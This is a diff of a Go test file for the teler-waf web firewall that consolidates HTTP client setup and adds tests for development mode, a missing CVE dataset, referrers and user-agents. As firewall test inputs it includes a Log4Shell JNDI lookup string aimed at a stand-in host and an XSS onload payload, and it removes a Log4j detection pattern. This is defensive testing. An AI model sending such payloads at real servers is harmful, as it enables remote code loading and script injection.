@@ -14,25 +14,24 @@ import (
 )
 
 // Prepraring handler for all cases
-var handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-	w.WriteHeader(http.StatusOK)
-})
+var (
+	handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	})
+	client = &http.Client{}
+
+	homeDir  string
+	cacheDir = filepath.Join(".cache", "teler-waf")
+)
 
 func init() {
-	cache := os.Getenv("CACHE")
+	homeDir, _ = os.UserHomeDir()
 
-	switch cache {
-	case "1", "true", "TRUE":
-		return
-	}
-
-	homeDir, err := os.UserHomeDir()
+	// Removing teler threat datasets
+	err := os.RemoveAll(filepath.Join(homeDir, cacheDir))
 	if err != nil {
 		panic(err)
 	}
-
-	cacheDir := filepath.Join(homeDir, ".cache", "teler-waf")
-	os.RemoveAll(cacheDir)
 }
 
 func TestNewDefaultOptions(t *testing.T) {
@@ -43,9 +42,6 @@ func TestNewDefaultOptions(t *testing.T) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -71,9 +67,6 @@ func TestNewWithNoStderr(t *testing.T) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -94,9 +87,6 @@ func TestNewWithNoUpdateCheck(t *testing.T) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -119,8 +109,26 @@ func TestNewWithLogFile(t *testing.T) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
+	// Create a request to send to the test server
+	req, err := http.NewRequest("GET", ts.URL, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	_, err = client.Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestNewWithDevelopment(t *testing.T) {
+	// Initialize teler
+	telerMiddleware := New(Options{NoStderr: true, Development: true})
+	wrappedHandler := telerMiddleware.Handler(handler)
+
+	// Create a test server with the wrapped handler
+	ts := httptest.NewServer(wrappedHandler)
+	defer ts.Close()
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -146,8 +154,32 @@ func TestNewWithWhitelist(t *testing.T) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
+	// Create a request to send to the test server
+	req, err := http.NewRequest("GET", ts.URL, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	_, err = client.Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestNewWithMalformedDataset(t *testing.T) {
+	// Remove CVEs dataset
+	cvesFile := filepath.Join(homeDir, cacheDir, "cves.json")
+	if err := os.Remove(cvesFile); err != nil {
+		panic(err)
+	}
+
+	// Initialize teler
+	telerMiddleware := New(Options{NoStderr: true})
+	wrappedHandler := telerMiddleware.Handler(handler)
+
+	// Create a test server with the wrapped handler
+	ts := httptest.NewServer(wrappedHandler)
+	defer ts.Close()
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -173,17 +205,6 @@ func TestNewCustom(t *testing.T) {
 			threat.DirectoryBruteforce,
 		},
 		Customs: []Rule{
-			{
-				Name:      "Log4j Attack",
-				Condition: "or",
-				Rules: []Condition{
-					{
-						Method:  request.GET,
-						Element: request.URI,
-						Pattern: `\$\{.*:\/\/.*\/?\w+?\}`,
-					},
-				},
-			},
 			{
 				Name:      "And condition",
 				Condition: "and",
@@ -218,6 +239,17 @@ func TestNewCustom(t *testing.T) {
 					},
 				},
 			},
+			{
+				Name:      "Any element",
+				Condition: "and",
+				Rules: []Condition{
+					{
+						Method:  request.GET,
+						Element: request.Any,
+						Pattern: `.`,
+					},
+				},
+			},
 		},
 		NoStderr: true,
 	})
@@ -227,18 +259,23 @@ func TestNewCustom(t *testing.T) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
+	pathList := []string{"", "/?foo=bar%24%7Bjndi%3Aldap%3A%2F%2Fbad.host%2FbadClassName%7D"}
 
-	// Create a request to send to the test server
-	req, err := http.NewRequest("GET", ts.URL, nil)
-	if err != nil {
-		t.Fatal(err)
-	}
+	for _, path := range pathList {
+		// Create a request to send to the test server
+		req, err := http.NewRequest("GET", ts.URL, nil)
+		if err != nil {
+			t.Fatal(err)
+		}
 
-	_, err = client.Do(req)
-	if err != nil {
-		t.Fatal(err)
+		if path != "" {
+			req.URL.Path = path
+		}
+
+		_, err = client.Do(req)
+		if err != nil {
+			t.Fatal(err)
+		}
 	}
 }
 
@@ -260,18 +297,23 @@ func TestNewCommonWebAttackOnly(t *testing.T) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
+	pathList := []string{"", `/?foo=bar%22onload%3Dalert%28%29`}
 
-	// Create a request to send to the test server
-	req, err := http.NewRequest("GET", ts.URL, nil)
-	if err != nil {
-		t.Fatal(err)
-	}
+	for _, path := range pathList {
+		// Create a request to send to the test server
+		req, err := http.NewRequest("GET", ts.URL, nil)
+		if err != nil {
+			t.Fatal(err)
+		}
 
-	_, err = client.Do(req)
-	if err != nil {
-		t.Fatal(err)
+		if path != "" {
+			req.URL.Path = path
+		}
+
+		_, err = client.Do(req)
+		if err != nil {
+			t.Fatal(err)
+		}
 	}
 }
 
@@ -292,9 +334,6 @@ func TestNewCVEOnly(t *testing.T) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -329,9 +368,6 @@ func TestNewBadIPAddressOnly(t *testing.T) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -365,21 +401,24 @@ func TestNewBadReferrerOnly(t *testing.T) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
+	// Define a list of referers to test
+	refList := []string{"https://waf.teler.app/", "http://34.gs/"}
 
-	// Create a request to send to the test server
-	req, err := http.NewRequest("GET", ts.URL, nil)
-	if err != nil {
-		t.Fatal(err)
-	}
+	// Loop over each endpoint path and send a request
+	for _, ref := range refList {
+		// Create a request to send to the test server
+		req, err := http.NewRequest("GET", ts.URL, nil)
+		if err != nil {
+			t.Fatal(err)
+		}
 
-	// Set the HTTP referrer of the request
-	req.Header.Set("Referer", "http://34.gs/")
+		// Set the HTTP referrer of the request
+		req.Header.Set("Referer", ref)
 
-	_, err = client.Do(req)
-	if err != nil {
-		t.Fatal(err)
+		_, err = client.Do(req)
+		if err != nil {
+			t.Fatal(err)
+		}
 	}
 }
 
@@ -401,18 +440,26 @@ func TestNewBadCrawlerOnly(t *testing.T) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
+	// Define a list of user-agents to test
+	uaList := []string{"", "Mozilla"}
 
-	// Create a request to send to the test server
-	req, err := http.NewRequest("GET", ts.URL, nil)
-	if err != nil {
-		t.Fatal(err)
-	}
+	// Loop over each endpoint path and send a request
+	for _, ua := range uaList {
+		// Create a request to send to the test server
+		req, err := http.NewRequest("GET", ts.URL, nil)
+		if err != nil {
+			t.Fatal(err)
+		}
 
-	_, err = client.Do(req)
-	if err != nil {
-		t.Fatal(err)
+		if ua != "" {
+			// Set the HTTP user-agent of the request
+			req.Header.Set("User-Agent", ua)
+		}
+
+		_, err = client.Do(req)
+		if err != nil {
+			t.Fatal(err)
+		}
 	}
 }
 
@@ -433,9 +480,6 @@ func TestNewDirectoryBruteforceOnly(t *testing.T) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -594,9 +638,6 @@ func BenchmarkTelerDefaultOptions(b *testing.B) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -605,7 +646,7 @@ func BenchmarkTelerDefaultOptions(b *testing.B) {
 
 	// Set the custom User-Agent so that the operation does
 	// not stop at the BadCrawler check
-	req.Header.Set("User-Agent", "awikwok")
+	req.Header.Set("User-Agent", "X")
 
 	// Run the benchmark
 	b.ReportAllocs()
@@ -635,9 +676,6 @@ func BenchmarkTelerCommonWebAttackOnly(b *testing.B) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -674,9 +712,6 @@ func BenchmarkTelerCVEOnly(b *testing.B) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -711,9 +746,6 @@ func BenchmarkTelerBadIPAddressOnly(b *testing.B) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -750,9 +782,6 @@ func BenchmarkTelerBadReferrerOnly(b *testing.B) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -787,9 +816,6 @@ func BenchmarkTelerBadCrawlerOnly(b *testing.B) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -828,9 +854,6 @@ func BenchmarkTelerDirectoryBruteforceOnly(b *testing.B) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -884,9 +907,6 @@ func BenchmarkTelerCustomRule(b *testing.B) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -917,9 +937,6 @@ func BenchmarkTelerWithoutCommonWebAttack(b *testing.B) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -955,9 +972,6 @@ func BenchmarkTelerWithoutCVE(b *testing.B) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -991,9 +1005,6 @@ func BenchmarkTelerWithoutBadIPAddress(b *testing.B) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
@@ -1029,9 +1040,6 @@ func BenchmarkTelerWithoutBadReferrer(b *testing.B) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -1066,9 +1074,6 @@ func BenchmarkTelerWithoutBadCrawler(b *testing.B) {
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
 
-	// Create a client to send requests to the test server
-	client := &http.Client{}
-
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
 	if err != nil {
@@ -1099,9 +1104,6 @@ func BenchmarkTelerWithoutDirectoryBruteforce(b *testing.B) {
 	// Create a test server with the wrapped handler
 	ts := httptest.NewServer(wrappedHandler)
 	defer ts.Close()
-
-	// Create a client to send requests to the test server
-	client := &http.Client{}
 
 	// Create a request to send to the test server
 	req, err := http.NewRequest("GET", ts.URL, nil)
